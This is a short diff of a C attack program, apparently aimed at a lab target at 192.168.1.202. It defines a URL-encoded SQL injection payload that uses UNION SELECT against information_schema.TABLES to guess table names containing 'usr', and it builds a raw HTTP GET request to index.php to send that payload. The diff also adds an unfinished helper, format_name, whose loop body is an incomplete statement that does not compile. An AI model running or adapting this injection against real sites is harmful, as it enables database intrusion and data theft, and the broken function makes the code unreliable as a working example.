@@ -209,13 +209,17 @@ bool recv_empty(int32_t sockfd) {
 #define PAYLOAD_BEGIN "order_id=0%20UNION%20SELECT%20table_name%20FROM%20information_schema.TABLES%20WHERE%20table_name%20LIKE%20%27%25usr%25%27%20AND%20table_name%20LIKE%20%27"
 #define PAYLOAD_END "%25%27%20LIMIT%201%3b"
 
-
+void format_name(char * formatted, const char * name) {
+    for (int i=0;i<10;i++) {
+        formatted[i*3]
+    }
+}
 
 bool send_check_success(char * discovered_name, int sockfd) {
     char mal_req[2048];
+    char formatted_discovered_name[33] = {0};
     sprintf(mal_req, "GET /index.php?%s%s%s HTTP/1.1\r\n"
         "Host: 192.168.1.202\r\n"
-        "Content-Type: application/x-www-form-urlencoded\r\n"
         "Connection: Keep-Alive\r\n"
         "\r\n",
         PAYLOAD_BEGIN, discovered_name, PAYLOAD_END
